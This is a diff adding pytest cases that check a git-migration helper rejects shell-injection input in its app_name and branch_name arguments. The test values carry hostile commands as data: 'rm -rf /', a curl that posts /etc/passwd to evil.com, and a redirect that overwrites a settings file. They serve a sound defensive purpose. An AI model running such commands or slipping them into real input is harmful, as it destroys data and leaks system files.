@@ -1,3 +1,4 @@
+import pytest
 from unittest.mock import MagicMock, patch
 
 from migration_rollback.utils.migration_utils import (
@@ -84,6 +85,32 @@ class TestGetAllMigratedAppNames:
 
 
 class TestGetLatestMigrationInGit:
+    @patch("migration_rollback.utils.migration_utils.Popen")
+    def test_strips_trailing_newline_from_result(self, mock_popen):
+        mock_popen.return_value = _mock_popen(b"\n")
+
+        result = get_latest_migration_in_git(app_name="myapp", branch_name="main")
+
+        assert result == ""
+
+    def test_raises_on_app_name_with_semicolon(self):
+        with pytest.raises(ValueError, match="Invalid app_name"):
+            get_latest_migration_in_git(app_name="my app; rm -rf /", branch_name="main")
+
+    def test_raises_on_app_name_with_pipe_and_quote(self):
+        # e.g. myapp" | curl -d @/etc/passwd https://evil.com #
+        with pytest.raises(ValueError, match="Invalid app_name"):
+            get_latest_migration_in_git(app_name='myapp" | curl -d @/etc/passwd https://evil.com #', branch_name="main")
+
+    def test_raises_on_branch_name_with_semicolon(self):
+        with pytest.raises(ValueError, match="Invalid branch_name"):
+            get_latest_migration_in_git(app_name="myapp", branch_name="main; rm -rf /")
+
+    def test_raises_on_branch_name_with_ampersand_and_redirect(self):
+        # e.g. main && echo 'malicious' > /app/settings.py
+        with pytest.raises(ValueError, match="Invalid branch_name"):
+            get_latest_migration_in_git(app_name="myapp", branch_name="main && echo 'malicious' > /app/settings.py")
+
     @patch("migration_rollback.utils.migration_utils.Popen")
     def test_returns_migration_number(self, mock_popen):
         mock_popen.return_value = _mock_popen(b"0003_add_field\n")
